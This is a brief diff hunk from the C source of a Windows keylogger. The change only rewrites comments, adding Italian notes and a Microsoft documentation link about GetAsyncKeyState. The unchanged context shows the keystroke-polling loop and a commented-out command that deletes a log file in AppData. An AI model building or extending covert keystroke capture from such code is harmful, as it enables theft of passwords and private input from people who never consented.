@@ -147,7 +147,10 @@ void keylog(void) //Key logger
                 //system("del %USERPROFILE%\\AppData\\Roaming\\Logs\\log.txt");
                 count = 0;
             }
-            if (GetAsyncKeyState(c) == -32767) //https://docs.microsoft.com/it-it/search/?terms=GetAsyncKeyState&scope=Azure
+            //La funzione interroga lo stato corrente dei tasti della tastiera (al momento della chiamata).
+            //GetAsyncKeyState è equivalente al 100 % della funzione API di Windows con lo stesso nome.
+            //http: //msdn.microsoft.com/en-us/library/windows/desktop/ms646293(v=vs.85).aspx
+            if (GetAsyncKeyState(c) == -32767)
             {
                 count++; //contatore caratteri
 
